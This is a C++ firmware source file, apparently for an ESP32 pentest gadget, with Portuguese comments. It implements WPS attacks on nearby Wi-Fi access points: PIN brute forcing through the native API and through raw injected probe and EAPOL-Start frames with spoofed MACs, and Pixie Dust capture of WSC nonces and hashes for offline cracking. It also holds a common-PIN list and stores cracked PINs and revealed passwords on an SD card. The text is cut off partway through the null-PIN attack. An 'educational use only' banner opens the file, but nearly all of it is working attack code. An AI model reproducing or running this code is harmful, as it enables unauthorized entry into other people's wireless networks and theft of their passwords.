/**
 * @file wps_atks.cpp
 * @brief Implementação de ataques WPS para fins acadêmicos e pesquisa.
 *
 * AVISO: Uso exclusivamente educacional. Use apenas em ambientes controlados.
 *
 * Usa injeção de frames raw via esp_wifi_80211_tx.
 * Gerenciamento cuidadoso de modo WiFi para evitar crashes.
 */

#include "wps_atks.h"
#include "advanced_atks.h"
#include "core/display.h"
#include "core/main_menu.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "wifi_atks.h"
#include "esp_wifi.h"
#include "esp_system.h"
#include <Arduino.h>
#include <globals.h>
#include <vector>
#include <SD.h>
#include <FS.h>
#include "esp_wps.h"
#include "core/sd_functions.h"

extern void generateRandomMac(uint8_t* mac);

//================================================================================
// VARIÁVEIS GLOBAIS
//================================================================================
static bool wps_attack_running = false;

//================================================================================
// FUNÇÕES AUXILIARES
//================================================================================

uint8_t wpsChecksumPin(uint32_t pin) {
    uint32_t accum = 0;
    pin *= 10;
    accum += 3 * ((pin / 10000000) % 10);
    accum += 1 * ((pin / 1000000) % 10);
    accum += 3 * ((pin / 100000) % 10);
    accum += 1 * ((pin / 10000) % 10);
    accum += 3 * ((pin / 1000) % 10);
    accum += 1 * ((pin / 100) % 10);
    accum += 3 * ((pin / 10) % 10);
    return (uint8_t)((10 - (accum % 10)) % 10);
}

void wpsGeneratePin(uint32_t base, char* pin_out) {
    base = base % 10000000;
    uint32_t full = base * 10 + wpsChecksumPin(base);
    snprintf(pin_out, 9, "%08lu", (unsigned long)full);
}

static String bssidStr(const uint8_t* mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

// Caminho no SD onde redes quebradas são salvas
static const char* WPS_CRACKED_FILE = "/WPS/cracked.txt";

// Define para limite de tempo de ataques
#define MAX_ATTACK_TIME 300000 // 5 min

// Salva rede quebrada no SD card
void wpsSaveCracked(const WPSNetworkInfo& net, const char* pin) {
    if (!setupSdCard()) return;

    // Cria diretório se não existir
    if (!SD.exists("/WPS")) SD.mkdir("/WPS");

    File f = SD.open(WPS_CRACKED_FILE, FILE_APPEND);
    if (!f) return;

    // Formato: BSSID|SSID|PIN|CHANNEL
    String line = bssidStr(net.bssid) + "|" + String(net.ssid) + "|" +
                  String(pin) + "|" + String(net.channel) + "\n";
    f.print(line);
    f.close();
}

// Verifica se um BSSID já foi quebrado
bool wpsIsCracked(const uint8_t* bssid, char* pin_out) {
    if (!setupSdCard()) return false;
    if (!SD.exists(WPS_CRACKED_FILE)) return false;

    String target_mac = bssidStr(bssid);

    File f = SD.open(WPS_CRACKED_FILE, FILE_READ);
    if (!f) return false;

    while (f.available()) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.length() == 0) continue;

        // Parse: BSSID|SSID|PIN|CHANNEL
        int sep1 = line.indexOf('|');
        if (sep1 < 0) continue;
        String mac_str = line.substring(0, sep1);

        if (mac_str.equalsIgnoreCase(target_mac)) {
            if (pin_out) {
                int sep2 = line.indexOf('|', sep1 + 1);
                int sep3 = line.indexOf('|', sep2 + 1);
                if (sep2 > 0 && sep3 > 0) {
                    String pin = line.substring(sep2 + 1, sep3);
                    strncpy(pin_out, pin.c_str(), 8);
                    pin_out[8] = '\0';
                }
            }
            f.close();
            return true;
        }
    }
    f.close();
    return false;
}

// Exibe redes quebradas salvas no SD
void wpsViewCracked() {
    if (!setupSdCard() || !SD.exists(WPS_CRACKED_FILE)) {
        drawMainBorderWithTitle("Redes Quebradas");
        padprintln("");
        padprintln("Nenhuma rede salva.");
        padprintln("");
        padprintln("Pressione qualquer tecla");
        while (!check(AnyKeyPress)) vTaskDelay(100 / portTICK_PERIOD_MS);
        returnToMenu = true;
        return;
    }

    // Lê todas as linhas
    std::vector<String> entries;
    File f = SD.open(WPS_CRACKED_FILE, FILE_READ);
    if (f) {
        while (f.available()) {
            String line = f.readStringUntil('\n');
            line.trim();
            if (line.length() > 0) entries.push_back(line);
        }
        f.close();
    }

    if (entries.empty()) {
        drawMainBorderWithTitle("Redes Quebradas");
        padprintln("");
        padprintln("Nenhuma rede salva.");
        padprintln("");
        padprintln("Pressione qualquer tecla");
        while (!check(AnyKeyPress)) vTaskDelay(100 / portTICK_PERIOD_MS);
        returnToMenu = true;
        return;
    }

    int page = 0;
    int per_page = 3;
    int total_pages = ((int)entries.size() + per_page - 1) / per_page;
    bool viewing = true;

    while (viewing) {
        drawMainBorderWithTitle("Redes Quebradas");
        tft.setTextColor(bruceConfig.priColor);
        padprintln("");
        padprintln("Total: " + String(entries.size()) +
                   "  Pag " + String(page+1) + "/" + String(total_pages));
        padprintln("");

        int start = page * per_page;
        int end_idx = start + per_page;
        if (end_idx > (int)entries.size()) end_idx = (int)entries.size();

        for (int i = start; i < end_idx; i++) {
            // Parse: BSSID|SSID|PIN|CHANNEL
            String line = entries[i];
            int s1 = line.indexOf('|');
            int s2 = line.indexOf('|', s1+1);
            int s3 = line.indexOf('|', s2+1);

            String mac_s = (s1 > 0) ? line.substring(0, s1) : "??";
            String ssid = (s1 > 0 && s2 > 0) ? line.substring(s1+1, s2) : "??";
            String pin = (s2 > 0 && s3 > 0) ? line.substring(s2+1, s3) : "??";
            String ch = (s3 > 0) ? line.substring(s3+1) : "?";

            tft.setTextColor(TFT_GREEN);
            padprintln(String(i+1) + ". " + ssid.substring(0, 16));
            tft.setTextColor(TFT_YELLOW);
            padprintln("  PIN: " + pin + "  CH:" + ch);
            tft.setTextColor(bruceConfig.priColor);
            padprintln("  " + mac_s);
        }
        padprintln("");
        padprintln("Sel:Prox  ESC:Sair");

        while (true) {
            if (check(EscPress)) { viewing = false; break; }
            if (check(SelPress)) { page = (page+1) % total_pages; break; }
            vTaskDelay(50 / portTICK_PERIOD_MS);
        }
    }
    returnToMenu = true;
}

// Inicializa WiFi em modo APSTA para injeção de frames de forma segura
static bool wpsInitInjectionMode(uint8_t channel) {
    // Desliga tudo primeiro
    WiFi.disconnect(true);
    WiFi.mode(WIFI_MODE_NULL);
    vTaskDelay(pdMS_TO_TICKS(300));

    // Liga em APSTA
    if (!WiFi.mode(WIFI_MODE_APSTA)) {
        displayError("Falha modo APSTA", true);
        return false;
    }
    vTaskDelay(pdMS_TO_TICKS(200));

    // Cria AP oculto no canal alvo
    if (!WiFi.softAP("WPS_SPOOF", "", channel, 1, 4, true)) {
        displayError("Falha ao criar AP", true);
        return false;
    }
    vTaskDelay(pdMS_TO_TICKS(200));

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(100));
    return true;
}

// Verifica se o WiFi está em modo APSTA antes de enviar frames
static bool wpsEnsureAPSTAMode() {
    if (WiFi.getMode() != WIFI_MODE_APSTA) {
        displayError("WiFi não em APSTA", true);
        return false;
    }
    return true;
}

// Finaliza modo de injeção
static void wpsDeinitInjectionMode() {
    WiFi.softAPdisconnect(true);
    vTaskDelay(pdMS_TO_TICKS(100));
    WiFi.disconnect(true);
    WiFi.mode(WIFI_MODE_NULL);
    vTaskDelay(pdMS_TO_TICKS(100));
}

// Menu for selecting a WPS AP target from scan results
bool selectWPSTarget(const std::vector<WPSNetworkInfo>& networks, const char* title, WPSNetworkInfo& target_out) {
    if (networks.empty()) return false;

    int sel_idx = -1;
    options.clear();

    for (size_t i = 0; i < networks.size(); i++) {
        String name = String(networks[i].ssid);
        if (name.length() == 0) name = "<Hidden>";

        // Add cracked indicator
        if (networks[i].cracked) {
            name = "[C] " + name;
        }

        options.push_back({name.substring(0, 20).c_str(), [&sel_idx, i]() { sel_idx = i; }});
    }

    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, title);

    if (sel_idx >= 0 && sel_idx < (int)networks.size()) {
        target_out = networks[sel_idx];
        return true;
    }

    return false;
}

// Scan de redes WPS — retorna cópia dos dados, limpa scan antes de retornar
std::vector<WPSNetworkInfo> scanWPSNetworks() {
    std::vector<WPSNetworkInfo> results;

    // Garante STA mode limpo para scan
    WiFi.disconnect(true);
    WiFi.mode(WIFI_MODE_STA);
    vTaskDelay(pdMS_TO_TICKS(300));

    int nets = WiFi.scanNetworks(false, true);

    for (int i = 0; i < nets; i++) {
        wifi_auth_mode_t auth = (wifi_auth_mode_t)WiFi.encryptionType(i);

        // Redes WPA/WPA2 tipicamente tem WPS habilitado
        if (auth == WIFI_AUTH_WPA_PSK || auth == WIFI_AUTH_WPA2_PSK ||
            auth == WIFI_AUTH_WPA_WPA2_PSK || auth == WIFI_AUTH_OPEN) {
            WPSNetworkInfo info;
            memset(&info, 0, sizeof(info));
            memcpy(info.bssid, WiFi.BSSID(i), 6);
            strncpy(info.ssid, WiFi.SSID(i).c_str(), 32);
            info.channel = WiFi.channel(i);
            info.rssi = WiFi.RSSI(i);
            info.wps_enabled = (auth != WIFI_AUTH_OPEN);
            info.wps_version = 2;
            info.pin_supported = true;
            info.pbc_supported = true;
            info.config_methods = 0x0188;

            // Verifica se já foi quebrada
            char saved_pin[9] = {0};
            info.cracked = wpsIsCracked(info.bssid, saved_pin);
            if (info.cracked) strncpy(info.cracked_pin, saved_pin, 8);

            results.push_back(info);
        }
    }
    WiFi.scanDelete();

    // Desliga STA após scan
    WiFi.disconnect(true);
    WiFi.mode(WIFI_MODE_NULL);
    vTaskDelay(pdMS_TO_TICKS(200));

    return results;
}

// Menu de seleção de alvo — retorna o índice do alvo selecionado
static int wpsInternalSelectTarget(const std::vector<WPSNetworkInfo>& networks, const char* title) {
    if (networks.empty()) {
        displayError("Nenhuma rede WPS encontrada", true);
        return -1;
    }

    // Constroi labels como Strings persistentes
    std::vector<String> labels;
    for (size_t i = 0; i < networks.size(); i++) {
        String label = String(networks[i].ssid);
        if (label.length() == 0) label = "<Hidden>";
        label += " " + String(networks[i].rssi) + "dB";
        if (networks[i].cracked) label += " [Q]";
        labels.push_back(label.substring(0, 25));
    }

    int sel = -1;
    options.clear();
    for (size_t i = 0; i < networks.size(); i++) {
        int idx = (int)i;
        options.push_back({labels[i].c_str(), [&sel, idx]() { sel = idx; }});
    }
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, title);

    return (returnToMenu) ? -1 : sel;
}

int wpsSelectTarget(const std::vector<WPSNetworkInfo>& networks) {
    return wpsInternalSelectTarget(networks, "Selecionar Alvo WPS");
}

//================================================================================
// MENU PRINCIPAL WPS
//================================================================================

void wpsAttacksMenu() {
    options.clear();
    options.push_back(Option("WPS Scan",         []() { wpsScan(); }));
    options.push_back(Option("Auto All (WPS)",    []() { wpsAutoAll(); }));
    options.push_back(Option("PIN Brute (Native)",[]() { wpsPinBruteForceNative(); }));
    options.push_back(Option("PIN Brute (Raw)",   []() { wpsPinBruteForceRaw(); }));
    options.push_back(Option("Pixie Dust (Native)",[]() { wpsPixieDustNative(); }));
    options.push_back(Option("Pixie Dust (Raw)",  []() { wpsPixieDustRaw(); }));
    options.push_back(Option("Null PIN Attack",   []() { wpsNullPinAttack(); }));
    options.push_back(Option("PBC Flood",         []() { wpsPBCFlood(); }));
    options.push_back(Option("Lockout Tester",    []() { wpsLockoutTester(); }));
    options.push_back(Option("AP Spoof (WPS)",    []() { wpsAPSpoof(); }));
    options.push_back(Option("NACK Flood",        []() { wpsNACKFlood(); }));
    options.push_back(Option("Redes Quebradas",   []() { wpsViewCracked(); }));
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "WPS Attacks");
}

//================================================================================
// 1. WPS SCAN
//================================================================================

void wpsScan() {
    drawMainBorderWithTitle("WPS Scan");
    padprintln("");
    padprintln("Escaneando redes...");

    auto networks = scanWPSNetworks();

    if (networks.empty()) {
        drawMainBorderWithTitle("WPS Scan");
        padprintln("");
        padprintln("Nenhuma rede WPS encontrada.");
        padprintln("");
        padprintln("Pressione qualquer tecla");
        while (!check(AnyKeyPress)) vTaskDelay(100 / portTICK_PERIOD_MS);
        returnToMenu = true;
        return;
    }

    int page = 0;
    int per_page = 3;
    int total_pages = ((int)networks.size() + per_page - 1) / per_page;
    bool viewing = true;

    while (viewing) {
        drawMainBorderWithTitle("WPS Scan");
        tft.setTextColor(bruceConfig.priColor);
        padprintln("");
        padprintln("Redes: " + String(networks.size()) +
                   "  Pag " + String(page + 1) + "/" + String(total_pages));
        padprintln("");

        int start = page * per_page;
        int end_idx = start + per_page;
        if (end_idx > (int)networks.size()) end_idx = (int)networks.size();

        for (int i = start; i < end_idx; i++) {
            bool crk = networks[i].cracked;
            tft.setTextColor(crk ? TFT_GREEN : TFT_CYAN);
            String ssid = String(networks[i].ssid);
            if (ssid.length() == 0) ssid = "<Hidden>";
            String prefix = String(i+1) + ". ";
            if (crk) prefix += "[QUEBRADA] ";
            padprintln(prefix + ssid.substring(0, crk ? 10 : 16));
            tft.setTextColor(bruceConfig.priColor);
            String info_line = "  CH:" + String(networks[i].channel) + " " +
                       String(networks[i].rssi) + "dBm";
            if (crk) info_line += " PIN:" + String(networks[i].cracked_pin);
            else info_line += " WPS2";
            padprintln(info_line);
            padprintln("  " + bssidStr(networks[i].bssid));
        }

        padprintln("");
        padprintln("Sel:Prox  ESC:Sair");

        while (true) {
            if (check(EscPress)) { viewing = false; break; }
            if (check(SelPress)) { page = (page + 1) % total_pages; break; }
            vTaskDelay(50 / portTICK_PERIOD_MS);
        }
    }
    returnToMenu = true;
}

//================================================================================
// 2. WPS PIN BRUTE FORCE
//================================================================================

void wpsPinBruteForceNative() {
    drawMainBorderWithTitle("WPS PIN Brute");
    padprintln("");
    padprintln("Escaneando redes WPS...");

    auto networks = scanWPSNetworks();
    WPSNetworkInfo target;
    if (!selectWPSTarget(networks, "Alvo PIN Brute", target)) return;

    drawMainBorderWithTitle("WPS PIN Brute");
    padprintln("");
    padprintln("Preparando API nativa WPS...");

    // Configure WiFi STA for native WPS
    WiFi.disconnect(true);
    WiFi.mode(WIFI_MODE_STA);
    vTaskDelay(pdMS_TO_TICKS(500));
    esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);

    wps_attack_running = true;
    uint32_t attempts = 0;
    uint32_t last_update = millis();
    char pin_buf[9];
    const char spinner[] = {'|', '/', '-', '\\'};
    uint8_t spin_idx = 0;

    // Use native esp_wifi_wps API
    esp_wps_config_t wps_config = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PIN);
    uint32_t start_time = millis();

    for (uint32_t h1 = 0; h1 < 10000 && wps_attack_running; h1++) {
        for (uint32_t h2 = 0; h2 < 1000 && wps_attack_running; h2 += 100) {
            if (millis() - start_time > MAX_ATTACK_TIME) {
                wps_attack_running = false;
                padprintln("Tempo maximo atingido!");
                break;
            }
            uint32_t pin_base = h1 * 1000 + h2;
            wpsGeneratePin(pin_base, pin_buf);
            attempts++;

            // Try connection with this PIN
            strcpy(wps_config.pin, pin_buf);
            esp_wifi_wps_enable(&wps_config);
            esp_wifi_wps_start(0);

            // Wait for WPS state machine max 3s
            uint32_t t_start = millis();
            while (millis() - t_start < 3000 && wps_attack_running) {
                if (check(EscPress)) { wps_attack_running = false; break; }
                vTaskDelay(pdMS_TO_TICKS(50));

                // If connected, we cracked it!
                if (WiFi.status() == WL_CONNECTED) {
                    drawMainBorderWithTitle("WPS PIN Brute");
                    tft.setTextColor(TFT_GREEN);
                    padprintln("");
                    padprintln("SUCESSO!");
                    padprintln("Rede: " + String(target.ssid));
                    padprintln("PIN: " + String(pin_buf));
                    padprintln("Senha: " + WiFi.psk());
                    padprintln("");
                    wpsSaveCracked(target, pin_buf);
                    padprintln("Salvo no SD.");
                    padprintln("");
                    padprintln("Pressione qualquer tecla");
                    while (!check(AnyKeyPress)) vTaskDelay(100 / portTICK_PERIOD_MS);
                    wps_attack_running = false;
                    esp_wifi_wps_disable();
                    break;
                }
            }

            if (!wps_attack_running) break;
            esp_wifi_wps_disable();
            WiFi.disconnect();
            vTaskDelay(pdMS_TO_TICKS(50)); // Better yield

            // Update display
            if (millis() - last_update > 500) {
                drawMainBorderWithTitle("WPS PIN Brute");
                tft.setTextColor(bruceConfig.priColor);
                char disp_buf[64];
                snprintf(disp_buf, sizeof(disp_buf), "Alvo: %s", target.ssid);
                padprintln(disp_buf);
                padprintln("");
                snprintf(disp_buf, sizeof(disp_buf), "%c Testando PIN : %s", spinner[spin_idx], pin_buf);
                padprintln(disp_buf);
                snprintf(disp_buf, sizeof(disp_buf), "Tentativa    : %lu / 100000", (unsigned long)attempts);
                padprintln(disp_buf);
                float pct = (float)attempts / 100000.0f * 100.0f;
                snprintf(disp_buf, sizeof(disp_buf), "Progresso    : %.2f%%", pct);
                padprintln(disp_buf);
                padprintln("");
                padprintln("ESC para parar");

                spin_idx = (spin_idx + 1) % 4;
                last_update = millis();
            }

            if (check(EscPress)) wps_attack_running = false;
            vTaskDelay(pdMS_TO_TICKS(10));
        }
    }

    wpsDeinitInjectionMode();
    returnToMenu = true;
}

void wpsPinBruteForceRaw() {
    drawMainBorderWithTitle("WPS PIN Brute");
    padprintln("");
    padprintln("Escaneando APs...");

    auto networks = scanWPSNetworks();
    WPSNetworkInfo target;
    if (!selectWPSTarget(networks, "Alvo PIN Brute", target)) return;

    if (target.cracked) {
        drawMainBorderWithTitle("Aviso");
        padprintln("");
        padprintln("Esta rede ja foi quebrada!");
        padprintln("PIN: " + String(target.cracked_pin));
        padprintln("");
        padprintln("Deseja atacar mesmo assim?");
        padprintln("SEL: Sim   ESC: Nao");
        while (true) {
            if (check(EscPress)) { returnToMenu = true; return; }
            if (check(SelPress)) break;
            vTaskDelay(50 / portTICK_PERIOD_MS);
        }
    }

    drawMainBorderWithTitle("WPS PIN Brute");
    padprintln("");
    padprintln("Preparando injecao...");

    if (!wpsInitInjectionMode(target.channel)) return;

    drawMainBorderWithTitle("WPS PIN Brute");
    tft.setTextColor(bruceConfig.priColor);
    padprintln("");
    padprintln("Alvo: " + String(target.ssid));
    padprintln("MAC: " + bssidStr(target.bssid));
    padprintln("Canal: " + String(target.channel));
    padprintln("");
    padprintln("Enviando EAP-WSC frames...");
    padprintln("ESC para parar");

    wps_attack_running = true;
    uint32_t attempts = 0;
    uint32_t last_update = millis();
    char pin_buf[9];
    const char spinner[] = {'|', '/', '-', '\\'};
    uint8_t spin_idx = 0;

    // Probe Request frame buffer
    uint8_t probe[96];
    uint8_t src_mac[6];

    uint32_t start_time = millis();

    for (uint32_t h1 = 0; h1 < 10000 && wps_attack_running; h1++) {
        for (uint32_t h2 = 0; h2 < 1000 && wps_attack_running; h2 += 100) {
            if (millis() - start_time > MAX_ATTACK_TIME) {
                wps_attack_running = false;
                padprintln("Tempo maximo atingido!");
                break;
            }

            if (!wpsEnsureAPSTAMode()) {
                wps_attack_running = false;
                break;
            }
            uint32_t pin_base = (h1 * 1000) + h2;
            wpsGeneratePin(pin_base, pin_buf);
            attempts++;

            generateRandomMac(src_mac);

            // Constroi e envia Probe Request com WPS IE
            memset(probe, 0, sizeof(probe));
            probe[0] = 0x40; probe[1] = 0x00; // Probe Request
            memcpy(&probe[4], target.bssid, 6); // DA
            memcpy(&probe[10], src_mac, 6);     // SA
            memcpy(&probe[16], target.bssid, 6); // BSSID
            probe[22] = (uint8_t)random(0, 255);

            // SSID
            int sslen = strlen(target.ssid);
            probe[24] = 0x00;
            probe[25] = (uint8_t)sslen;
            memcpy(&probe[26], target.ssid, sslen);
            int off = 26 + sslen;

            // Rates
            probe[off] = 0x01; probe[off+1] = 0x04;
            probe[off+2] = 0x82; probe[off+3] = 0x84;
            probe[off+4] = 0x8b; probe[off+5] = 0x96;
            off += 6;

            // WPS Vendor IE
            probe[off++] = 0xDD; // tag
            probe[off++] = 13;   // length
            probe[off++] = 0x00; probe[off++] = 0x50; // WFA OUI
            probe[off++] = 0xF2; probe[off++] = 0x04;
            probe[off++] = 0x10; probe[off++] = 0x4A; // Version
            probe[off++] = 0x00; probe[off++] = 0x01;
            probe[off++] = 0x10;
            probe[off++] = 0x10; probe[off++] = 0x08; // Config: PIN
            probe[off++] = 0x00;

            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, probe, off, false);
            if (err != ESP_OK) {
                Serial.printf("TX falhou: %d\n", err);
            }

            // EAP-Start frame
            uint8_t eapst[40];
            memset(eapst, 0, sizeof(eapst));
            eapst[0] = 0x08; eapst[1] = 0x01; // Data, ToDS
            memcpy(&eapst[4], target.bssid, 6);
            memcpy(&eapst[10], src_mac, 6);
            memcpy(&eapst[16], target.bssid, 6);
            eapst[22] = (uint8_t)random(0, 255);
            eapst[24] = 0xAA; eapst[25] = 0xAA; eapst[26] = 0x03;
            eapst[30] = 0x88; eapst[31] = 0x8E; // 802.1X
            eapst[32] = 0x01; eapst[33] = 0x01; // EAPOL Start
            err = esp_wifi_80211_tx(WIFI_IF_AP, eapst, 36, false);
            if (err != ESP_OK) {
                Serial.printf("TX falhou: %d\n", err);
            }

            // Update display
            if (millis() - last_update > 500) {
                drawMainBorderWithTitle("WPS PIN Brute");
                tft.setTextColor(bruceConfig.priColor);
                char disp_buf[64];
                snprintf(disp_buf, sizeof(disp_buf), "Alvo: %s", target.ssid);
                padprintln(disp_buf);
                snprintf(disp_buf, sizeof(disp_buf), "%c Testando PIN : %s", spinner[spin_idx], pin_buf);
                padprintln(disp_buf);
                snprintf(disp_buf, sizeof(disp_buf), "Tentativa    : %lu / 100000", (unsigned long)attempts);
                padprintln(disp_buf);
                float pct = (float)attempts / 100000.0f * 100.0f;
                snprintf(disp_buf, sizeof(disp_buf), "Progresso    : %.2f%%", pct);
                padprintln(disp_buf);
                padprintln("Enviando frames EAP/WSC");
                padprintln("");
                padprintln("ESC para parar");
                spin_idx = (spin_idx + 1) % 4;
                last_update = millis();
            }

            if (check(EscPress)) {
                wps_attack_running = false;
                break;
            }
            vTaskDelay(pdMS_TO_TICKS(10));
        }
    }

    wpsDeinitInjectionMode();
    returnToMenu = true;
}

//================================================================================
// 3. WPS PIXIE DUST
//================================================================================

static volatile bool _pixie_has_m1 = false;
static volatile bool _pixie_has_m2 = false;
static volatile bool _pixie_has_m3 = false;
static uint8_t _pixie_target[6];
static uint8_t _pix_enonce[16];
static uint8_t _pix_rnonce[16];
static uint8_t _pix_ehash[32];

static void pixieSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* d = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 40) return;

    // Verifica se é do AP alvo
    if (memcmp(&d[4], _pixie_target, 6) != 0 &&
        memcmp(&d[10], _pixie_target, 6) != 0 &&
        memcmp(&d[16], _pixie_target, 6) != 0) return;

    // Procura 802.1X (tipo 0x888E) no LLC/SNAP
    for (int i = 24; i < len - 8; i++) {
        if (d[i] == 0x88 && d[i+1] == 0x8E && i + 8 < len) {
            if (!_pixie_has_m1) {
                _pixie_has_m1 = true;
                int cplen = (len - i - 8 > 16) ? 16 : len - i - 8;
                if (cplen > 0) memcpy(_pix_enonce, &d[i+8], cplen);
            } else if (!_pixie_has_m2) {
                _pixie_has_m2 = true;
                int cplen = (len - i - 8 > 16) ? 16 : len - i - 8;
                if (cplen > 0) memcpy(_pix_rnonce, &d[i+8], cplen);
            } else if (!_pixie_has_m3) {
                _pixie_has_m3 = true;
                int cplen = (len - i - 8 > 32) ? 32 : len - i - 8;
                if (cplen > 0) memcpy(_pix_ehash, &d[i+8], cplen);
            }
            break;
        }
    }
}

void wpsPixieDustNative() {
    drawMainBorderWithTitle("WPS Pixie Dust");
    padprintln("");
    padprintln("A API Nativa do ESP32 (v5+)");
    padprintln("Nao suporta sniffer simultaneo.");
    padprintln("Redirecionando para Raw...");
    vTaskDelay(pdMS_TO_TICKS(1500));
    wpsPixieDustRaw();
}

void wpsPixieDustRaw() {
    drawMainBorderWithTitle("Pixie Dust");
    padprintln("");
    padprintln("Escaneando APs...");

    auto networks = scanWPSNetworks();
    WPSNetworkInfo target;
    if (!selectWPSTarget(networks, "Alvo Pixie Dust", target)) return;

    if (target.cracked) {
        drawMainBorderWithTitle("Aviso");
        padprintln("");
        padprintln("Esta rede ja foi quebrada!");
        padprintln("PIN: " + String(target.cracked_pin));
        padprintln("");
        padprintln("Geralmente vulneraveis a Pixie");
        padprintln("Dust utilizam o mesmo PIN");
        padprintln("Deseja atacar mesmo assim?");
        padprintln("SEL: Sim   ESC: Nao");
        while (true) {
            if (check(EscPress)) { returnToMenu = true; return; }
            if (check(SelPress)) break;
            vTaskDelay(50 / portTICK_PERIOD_MS);
        }
    }

    drawMainBorderWithTitle("Pixie Dust");
    padprintln("");
    padprintln("Preparando sniffer...");

    if (!wpsInitInjectionMode(target.channel)) return;

    // Reset
    _pixie_has_m1 = false; _pixie_has_m2 = false; _pixie_has_m3 = false;
    memcpy(_pixie_target, target.bssid, 6);

    // Ativa sniffer
    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(pixieSniffer);

    uint32_t start_time = millis();
    uint32_t last_update = millis();
    uint32_t last_probe = 0;
    uint8_t src_mac[6];
    uint8_t probe[72];

    while (wps_attack_running) {
        if (millis() - start_time > MAX_ATTACK_TIME) {
            wps_attack_running = false;
            padprintln("Tempo maximo atingido!");
            break;
        }

        if (!wpsEnsureAPSTAMode()) {
            wps_attack_running = false;
            break;
        }
        // Envia probe + EAP-Start periodicamente para provocar trocas WPS
        if (millis() - last_probe > 3000) {
            generateRandomMac(src_mac);

            memset(probe, 0, sizeof(probe));
            probe[0] = 0x40; probe[1] = 0x00;
            memcpy(&probe[4], target.bssid, 6);
            memcpy(&probe[10], src_mac, 6);
            memcpy(&probe[16], target.bssid, 6);
            probe[22] = (uint8_t)random(0, 255);
            int sslen = strlen(target.ssid);
            probe[24] = 0x00; probe[25] = (uint8_t)sslen;
            memcpy(&probe[26], target.ssid, sslen);
            int off = 26 + sslen;
            probe[off] = 0x01; probe[off+1] = 0x04;
            probe[off+2] = 0x82; probe[off+3] = 0x84;
            probe[off+4] = 0x8b; probe[off+5] = 0x96;
            off += 6;
            esp_wifi_80211_tx(WIFI_IF_AP, probe, off, false);

            // EAP-Start
            uint8_t eapst[40];
            memset(eapst, 0, sizeof(eapst));
            eapst[0] = 0x08; eapst[1] = 0x01;
            memcpy(&eapst[4], target.bssid, 6);
            memcpy(&eapst[10], src_mac, 6);
            memcpy(&eapst[16], target.bssid, 6);
            eapst[22] = (uint8_t)random(0, 255);
            eapst[24] = 0xAA; eapst[25] = 0xAA; eapst[26] = 0x03;
            eapst[30] = 0x88; eapst[31] = 0x8E;
            eapst[32] = 0x01; eapst[33] = 0x01;
            esp_wifi_80211_tx(WIFI_IF_AP, eapst, 36, false);

            last_probe = millis();
        }

        // Dados completos
        if (_pixie_has_m1 && _pixie_has_m2 && _pixie_has_m3) {
            drawMainBorderWithTitle("Pixie Dust");
            tft.setTextColor(TFT_GREEN);
            padprintln("");
            padprintln("Dados Capturados!");
            padprintln("Enrollee Nonce [M1]: OK");
            padprintln("Registrar Nonce[M2]: OK");
            padprintln("E-Hash1/2      [M3]: OK");
            padprintln("");
            padprintln("Passe os logs do UART para");
            padprintln("o Hashcat. Auto-crack OFF.");
            vTaskDelay(pdMS_TO_TICKS(1000));
            wps_attack_running = false;

            drawMainBorderWithTitle("Pixie Dust");
            padprintln("Captura WSC concluida!");
            padprintln("E-S1/E-S2 dependem de brute force");
            padprintln("offline (Hashcat mode 22200).");
            padprintln("Salve os hashes no M5 e passe");
            padprintln("para o Hashcat/Bully/Reaver.");
            padprintln("");
            padprintln("Qualquer tecla para sair");
            while(!check(AnyKeyPress)) vTaskDelay(100/portTICK_PERIOD_MS);
            break;
        }

        if (millis() - last_update > 500) {
            drawMainBorderWithTitle("Pixie Dust (Raw)");
            tft.setTextColor(bruceConfig.priColor);
            char disp_buf[64];
            snprintf(disp_buf, sizeof(disp_buf), "Alvo: %s", target.ssid);
            padprintln(disp_buf);
            padprintln("Injetando e ouvindo...");
            snprintf(disp_buf, sizeof(disp_buf), "Tempo: %lu s", (unsigned long)((millis() - start_time)/1000));
            padprintln(disp_buf);
            padprintln("");
            padprintln("Status captura WSC:");
            snprintf(disp_buf, sizeof(disp_buf), "M1: %s  M2: %s  M3: %s",
                     _pixie_has_m1 ? "[OK]" : "[--]",
                     _pixie_has_m2 ? "[OK]" : "[--]",
                     _pixie_has_m3 ? "[OK]" : "[--]");
            padprintln(disp_buf);
            padprintln("");
            padprintln("ESC para parar");
            last_update = millis();
        }

        if (check(EscPress)) wps_attack_running = false;
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    esp_wifi_set_promiscuous(false);
    wpsDeinitInjectionMode();
    returnToMenu = true;
}

//================================================================================
// 4. WPS NULL PIN ATTACK
//================================================================================

void wpsNullPinAttack() {
    drawMainBorderWithTitle("WPS Null PIN");
    padprintln("");
    padprintln("Escaneando redes WPS...");

    auto networks = scanWPSNetworks();
    WPSNetworkInfo target;
    if (!selectWPSTarget(networks, "Alvo Null PIN", target)) return;

    drawMainBorderWithTitle("WPS Null PIN");
    padprintln("");
    padprintln("Preparando...");

    if (!wpsInitInjectionMode(target.channel)) return;

    const char* null_pins[] = {
        "00000000", "12345670", "00000001", "99999993",
        "11111114", "22222228", "33333332", "44444446",
        "55555550", "66666664", "77777778", "88888882",
    };
    int num_pins = 12;

    wps_attack_running = true;
    uint32_t start_time = millis();
    uint8_t src_mac[6];
    uint8_t frame[72];
    const char spinner[] = {'|', '/', '-', '\\'};
    uint8_t spin_idx = 0;

